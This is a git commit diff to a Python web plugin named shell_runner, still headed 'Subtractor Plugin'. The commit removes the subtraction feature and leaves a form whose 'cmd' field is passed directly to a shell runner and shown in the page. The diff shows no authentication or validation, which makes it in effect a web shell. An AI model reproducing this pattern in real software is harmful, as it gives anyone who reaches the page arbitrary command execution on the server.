ab2136b7adb1b77389e5e48028e78c8b46e63b0f
Kesehet <hamood.siddiqui@gmail.com>
2023-03-11 16:57:24 +0530

    jjjj

--- plugins/shell_runner/shell_runner.py
+++ plugins/shell_runner/shell_runner.py
@@ -12,20 +12,8 @@ def main(request):
 
 
 def mresult(request):
-  num1 = request.form.get("n1")
-  num2 = request.form.get("n2")
-  ans = ""
-  if num1 != "" and num2 != "":
-    num2 = int(num2)
-    num1 = int(num1)
-    if num2 > num1:
-      ans = "<h1> Result: " + str(num2 - num1) + "</h1>"
-    elif num2 == num1:
-      ans = "<h1> Result: " + str(num2 - num1) + "</h1>"
-    else:
-      ans = "<h1> Result: " + str(num1 - num2) + "</h1>"
   cmd = request.form.get("cmd")
-  return template(ans + "<pre>"+SHELL.run(cmd)+"</pre>")
+  return template("<pre>"+SHELL.run(cmd)+"</pre>")
 
 
 def template(result):
@@ -34,8 +22,6 @@ def template(result):
     <h1>Subtractor Plugin</h1>
     <form method="post" action="''' + S.Urls["plugin"].replace(
     '<name>', name).replace("<functionCall>", "mresult") + '''">
-      <input name="n1" type="number">
-      <input name="n2" type="number">
       <input name="cmd" type="text">
       <input type="submit">
     </form>
